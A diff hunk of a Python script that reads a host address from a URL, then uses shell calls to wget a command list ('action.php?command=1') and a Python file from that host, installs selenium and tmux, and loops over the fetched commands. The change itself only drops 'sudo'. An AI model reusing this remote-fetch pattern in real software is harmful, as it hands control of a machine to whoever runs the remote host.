@@ -6,8 +6,8 @@ dataurl = requests.get(url)
 os.system("wget -O l.txt "+dataurl.text+"/xyz/web/action.php?command=1")
 os.system("wget "+dataurl.text+"/xyz/xyz.py")
 os.system("pip install selenium")
-os.system("sudo apt-get update -y")
-os.system("sudo apt-get install tmux -y")
+os.system("apt-get update -y")
+os.system("apt-get install tmux -y")
 while True:
     with open("l.txt", "r", encoding="utf-8") as file:
         for line in file:
